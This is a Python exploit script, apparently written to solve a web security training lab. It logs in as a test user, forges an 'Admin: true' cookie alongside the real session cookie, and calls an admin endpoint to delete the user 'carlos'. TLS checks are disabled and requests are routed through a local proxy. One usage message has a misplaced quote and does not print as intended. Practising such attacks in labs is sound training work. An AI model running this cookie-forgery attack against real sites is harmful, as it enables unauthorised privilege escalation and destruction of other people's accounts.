import requests
import sys
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

FAIL = -1

proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080'}

def get_csrf_token(url, session):
    response = session.get(
        url,
        verify=False,
        proxies=proxies)
    html = BeautifulSoup(
        response.text,
        'html.parser')
    csrf = html.find(
        "input", {'name': 'csrf'})['value']
    return csrf

def is_login_successful(url, session):
    login_url = url + "/login"
    csrf_token = get_csrf_token(
         login_url,
         session)
    data = {
    "csrf": csrf_token,
    "username": "wiener",
    "password": "peter"}
    response = session.post(
         login_url,
         data=data,
         verify=False,
         proxies=proxies)
    return "Log out" in response.text

def is_delete_carlos_successful(url, session):
    my_account_url = url + "/my-account"
    response = session.get(
        my_account_url,
        verify=False,
        proxies=proxies)
    session_cookie = (
    response.cookies
        .get_dict()
        .get('session'))
    delete_carlos_user_url = (
        url + "/admin/delete?username=carlos")
    cookies = {
        'Admin': 'true',
        'session': session_cookie}
    response = requests.get(
        delete_carlos_user_url,
        cookies=cookies, 
        verify=False, proxies=proxies)
    return response.status_code == 200

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        session = requests.Session()
        print("[+] Starting Access Control attack...")
        if not is_login_successful(url, session):
            print("[-] Login was not successful.")
            sys.exit(FAIL)
        if not is_delete_carlos_successful(url, session):
            print("[-] Deleting carlos was not successful.")
            sys.exit(FAIL)
        print("[+] The Access Control attack was successful.")
    except IndexError:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print("[-] Example: %s www.example.com' % sys.argv[0]")
        sys.exit(FAIL)
    except Exception as exception:
        print("[-] An exception occured %s" % exception)
        print("[-] The Access Control attack was not successful.")
        sys.exit(FAIL) 